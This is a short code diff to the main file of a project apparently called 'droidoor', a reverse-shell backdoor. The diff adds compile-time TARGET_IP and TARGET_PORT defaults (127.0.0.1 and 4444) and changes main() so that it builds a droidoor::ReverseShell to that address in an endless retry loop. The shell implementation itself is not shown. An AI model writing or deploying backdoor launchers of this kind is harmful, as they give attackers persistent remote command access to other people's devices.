@@ -1,3 +1,11 @@
+#ifndef TARGET_IP
+    #define TARGET_IP "127.0.0.1"
+#endif
+
+#ifndef TARGET_PORT
+    #define TARGET_PORT 4444
+#endif
+
 #include "src/droidoor/rshell.hpp"
 #include <string>
 #include <cstdint>
@@ -5,8 +13,9 @@
 #include <unistd.h>
 
 int main(){
-    std::string ip = "";
-    uint16_t port = 0;
+    std::string ip = TARGET_IP;
+    uint16_t port = TARGET_PORT;
+    
     while (true) {
         try {
         droidoor::ReverseShell rshell(ip, port);
